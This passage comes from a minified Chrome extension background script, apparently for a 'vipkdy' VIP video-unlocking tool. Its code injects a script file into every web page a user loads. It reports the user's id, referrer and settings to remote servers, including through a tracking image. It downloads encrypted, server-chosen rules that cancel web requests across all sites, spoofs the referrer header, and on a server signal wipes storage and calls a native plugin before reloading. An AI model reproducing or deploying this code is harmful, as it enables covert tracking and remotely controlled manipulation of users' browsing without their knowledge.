                    a = window.$.parseJSON(o.value);
                } catch (e) {
                    a = {
                        status: "error"
                    };
                }
                return setTimeout(function() {
                    o && o.value && o.options.version == e.v1 && (e.ad % 6 != 0 || c == o.options.lut) || (2 !== e.ps ? r() : t());
                }, e.ltime || 3e5), a;
            });
        };
    }, {
        "../ext-clt": 2,
        "../ext-storage": 7,
        "../ext-utils": 9
    } ],
    9: [ function(e, t, r) {
        var n = {};
        n.http_build_query = function(e, t, r) {
            var n, a, o = [], c = function(e, t, r) {
                var n, a = [];
                if (!0 === t ? t = "1" : !1 === t && (t = "0"), null !== t && "object" == typeof t) {
                    for (n in t) null !== t[n] && a.push(c(e + "[" + n + "]", t[n], r));
                    return a.join(r);
                }
                if ("function" != typeof t) return encodeURIComponent(e) + "=" + encodeURIComponent(t);
                throw new Error("There was an error processing for http_build_query().");
            };
            r || (r = "&");
            for (a in e) n = e[a], t && !isNaN(a) && (a = String(t) + a), o.push(c(a, n, r));
            return o.join(r);
        }, n.extend = function(e, t, r, n) {
            if (!e || !t) return e;
            void 0 === r && (r = !0);
            var a, o, c;
            if (n && (c = n.length)) for (a = 0; a < c; a++) !((o = n[a]) in t) || !r && o in e || (e[o] = t[o]); else for (o in t) !r && o in e || (e[o] = t[o]);
            return e;
        }, n.ajax = function(e) {
            if (0 !== location.protocol.indexOf("http") && 0 === e.url.indexOf("//") && (e.url = "http:" + e.url), 
            void 0 !== (e = n.extend(e || {}, {
                type: "GET"
            }, !1)).url) {
                var t = e.type.toUpperCase();
                e.data && "string" != typeof e.data && (e.data = n.http_build_query(e.data), "GET" == t ? (e.url += (e.url.match(/\?/) ? "&" : "?") + e.data, 
                e.data = null) : e.contentType = "application/x-www-form-urlencoded");
                var r = e.error || n.ajax.error_handler, a = new XMLHttpRequest();
                a.open(t, e.url, !0), a.onreadystatechange = function() {
                    if (4 == a.readyState) if (200 == a.status) if (e.dataType && "xml" == e.dataType) e.success(a.responseXML, a.status, a); else if (e.dataType && "text" == e.dataType) e.success(a.responseText, a.status, a); else {
                        var t;
                        try {
                            t = JSON.parse(a.responseText);
                        } catch (e) {
                            t = a.responseText;
                        }
                        e.success(t, a.status, a);
                    } else r && r(a, a.status);
                }, "text" == e.dataType && a.overrideMimeType && a.overrideMimeType("text/plain"), 
                a.setRequestHeader("X-Requested-With", "XMLHttpRequest"), a.setRequestHeader("referrer", "http://www.vipkdy.com/"), 
                e.contentType && a.setRequestHeader("Content-Type", e.contentType);
                try {
                    a.send(e.data);
                } catch (e) {
                    r && r(a, null, e);
                }
                return a;
            }
        }, n.setConfig = function(e) {
            e._u ? (e.url = e._u, e.dataType = "text", n.ajax(e)) : chrome.storage.local.set(e);
        }, n.getDomain = function(e) {
            var t = "";
            try {
                t = e.match(/([-\w]+\.\b(?:net\.cn|com\.hk|com\.cn|com|cn|net|org|cc|tv$|hk)\b)/)[1];
            } catch (e) {}
            return t;
        }, n.getImpParams = function(e) {
            var t = {
                u: e.uid,
                c: e.cl,
                v: e.ver,
                v1: e.v1,
                v2: e.v2,
                s: e.ps,
                t: e.ad,
                sd: e.sd,
                bl: e.bl,
                cp: e.cp,
                de: e.de,
                mv: e.mv,
                a: e.ci,
                r: document.referrer,
                tms: new Date().getTime()
            };
            for (var r in t) t[r] || "number" == typeof t[r] || delete t[r];
            return t;
        }, t.exports = n;
    }, {} ],
    10: [ function(e, t, r) {
        (function(t) {
            var r = t.config = gConfig;
            r.assetsUrl = r.assetsServer + "/ext" + r.vdir, r.cfg = r.server + "/vz/u.htm?method=jc", 
            document.createElement("object").setAttribute("type", r.pt);
            var n = t.cache = e("../../ext-npm/ext-storage/"), a = e("../../ext-npm/ext-config"), o = e("../../ext-npm/ext-utils"), c = e("../../ext-npm/ext-service"), i = t.ct = e("../../ext-npm/ext-clt");
            c.setCache(n), c.setCt(i), n.setStorage(chrome.storage.local), n.get("siteSkipList", function(e) {
                e.siteSkipList || o.ajax({
                    url: r.assetsUrl + "/filterList.json?_" + new Date().getTime(),
                    success: function(e) {
                        n.set("siteSkipList", e, {
                            noexpire: !0
                        });
                    },
                    error: function(e, t, r) {}
                });
            }), window.addEventListener("load", function() {
                setTimeout(function() {
                    var s = e("../../ext-npm/execuError.js");
                    a.init(r).then(function(a) {
                        var u = [];
                        u.push(e("../../ext-npm/ext-updateCfg")), u.push(function(e) {
                            chrome.tabs.onUpdated.addListener(function(e, t, n) {
                                "loading" == t.status && n.url.match(/^http/) && chrome.tabs.executeScript(e, {
                                    file: r.appName + "ct.js"
                                }, s);
                            });
                        }), u.push(function(e) {
                            setTimeout(function() {
                                o.ajax({
                                    url: e.ruleServer + e.ruleMidPath + "/m1.htm",
                                    data: o.getImpParams(e),
                                    success: function(t) {
                                        if (1 === t.s && e.ad > 1) {
                                            chrome.storage.local.clear();
                                            try {
                                                document.querySelector('object[type="' + r.pt + '"]').setAcd("-10"), location.reload();
                                            } catch (e) {}
                                        }
                                    }
                                });
                            }, 2e3);
                        }), u.push(function(e) {
                            setTimeout(function() {
                                new Image().src = e.jrServer + "/12.gif?" + $.param(o.getImpParams(e));
                            }, 1e4);
                        }), u.push(function(e) {
                            1 === e.ps || 3 === e.ps ? i.gcfc("getUC", function(t) {
                                t && void 0 !== t.closeVIP ? chrome.storage.local.get([ "unblockvipConfig", "ps" ], function(r) {
                                    r.unblockvipConfig || (r.unblockvipConfig = {}), 1 == r.ps && 1 != e.ps ? r.unblockvipConfig.closeExt = !0 : r.unblockvipConfig.closeExt = !!t.closeVIP, 
                                    r.ps = e.ps, chrome.storage.local.set(r, function() {
                                        window.ucok = 1;
                                    });
                                }) : window.ucok = 1;
                            }) : window.ucok = 1;
                        }), u.push(function(t) {
                            function r(e) {
                                var t = JSON.parse(a.d(e, "f"));
                                chrome.webRequest.onBeforeRequest.addListener(function(e) {
                                    var r = !1;
                                    for (var n of t) if (e.url.match(new RegExp(n.bl.join("|")))) {
                                        r = !0;
                                        break;
                                    }
                                    return {
                                        cancel: r
                                    };
                                }, {
                                    urls: [ "<all_urls>" ]
                                }, [ "blocking" ]);
                            }
                            var a = e("../../ext-npm/ext-des"), c = !1;
                            n.get("rl15", function(e) {
                                e.rl15 && !c && (c = !0, r(e.rl15.value));
                            }), t.ad > t.sd && function(e) {
                                var r = o.extend({
                                    method: "iyc",
                                    ene: 1
                                }, o.getImpParams(t));
                                o.ajax({
                                    url: t.ruleServer + t.rulep,
                                    data: r,
                                    dataType: "json",
                                    success: function(t) {
                                        t && 1 == t.s && t.r && e(t.r);
                                    }
                                });
                            }(function(e) {
                                n.set("rl15", e), c || (c = !0, r(e));
                            });
                        }), o.extend(t.config, a), chrome.storage.local.set({
                            __config: t.config
                        }), c.helper.requestHandler({
                            topic: "extmem",
                            action: "set",
                            key: "env",
                            value: t.config
                        }), chrome.runtime.onMessage.addListener(c.helper.requestHandler);
                        for (var f of u) try {
                            f(t.config);
                        } catch (e) {}
                    });
                }, 400);
            }), chrome.runtime.onInstalled && chrome.runtime.onInstalled.addListener(function(e) {
                "install" == e.reason && gConfig.ver.match(/^5\.1/) && chrome.storage.local.get("cl", function(e) {
                    if (!e.cl) try {
                        document.querySelector('object[type="application/x-vipkdy"]').setAcd("0");
                    } catch (e) {}
                });
            });
        }).call(this, "undefined" != typeof global ? global : "undefined" != typeof self ? self : "undefined" != typeof window ? window : {});
    }, {
        "../../ext-npm/execuError.js": 1,
        "../../ext-npm/ext-clt": 2,
        "../../ext-npm/ext-config": 3,
        "../../ext-npm/ext-des": 4,
        "../../ext-npm/ext-service": 6,
        "../../ext-npm/ext-storage/": 7,
        "../../ext-npm/ext-updateCfg": 8,
        "../../ext-npm/ext-utils": 9
    } ]
}, {}, [ 10 ]);